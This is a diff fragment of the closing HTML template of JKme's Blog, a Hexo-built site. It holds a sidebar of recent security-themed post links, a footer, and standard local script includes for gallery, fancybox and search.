+			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+		
+			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
+      </li>
+    
+      <li>
+        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
+      </li>
+    
+      <li>
+        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
+      </li>
+    
+      <li>
+        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
